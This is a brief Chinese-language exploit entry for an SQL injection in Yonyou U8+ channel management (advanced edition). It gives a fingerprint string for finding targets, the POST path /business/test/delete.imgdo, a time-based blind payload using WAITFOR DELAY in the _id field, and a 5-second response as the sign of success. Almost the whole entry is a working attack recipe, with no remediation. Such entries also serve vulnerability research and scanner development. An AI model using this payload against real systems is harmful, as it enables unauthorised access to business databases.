# 用友U8+渠道管理(高级版)delete.imgdo存在SQL注入漏洞

用友 ｜ SQL注入 ｜ —
- **指纹**：`"common/images/dot.gif"`
- **请求**：`POST /business/test/delete.imgdo HTTP/1.1`

**Payload**
```
_id=';WAITFOR DELAY '0:0:5'--
```
- **响应特征**：200 5s